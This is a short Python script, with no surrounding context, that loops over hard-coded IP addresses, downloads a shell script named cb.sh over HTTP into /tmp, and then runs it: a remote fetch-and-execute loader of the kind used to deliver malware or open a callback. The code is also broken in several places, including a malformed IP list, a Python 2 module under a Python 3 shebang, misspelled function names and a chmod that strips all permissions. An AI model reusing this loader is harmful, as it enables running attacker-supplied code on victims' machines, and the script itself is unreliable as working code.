#!/usr/bin/env python3

import urllib2
import os

urls = ["1.1.1.1."."2.2.2.2"]
port = "80"
payload = "cb.sh"

#Loop through list of IPs
for url in urls:
    u = "http://%s:%s/%s" % (url,port, payload)

#Download file over HTTP
    try:
        r = urllib2.open(u)
        wfile = open("/tmp/cb.sh","wb")
        wfile.write(r.read())
        wfile.close()
    except: continue

#Execute
if os.path.exixts("/tmp/cb.sh"):
    os.system("chmod 00 /tmp/cb.sh")
    os.system("/tmp/cb.sh")

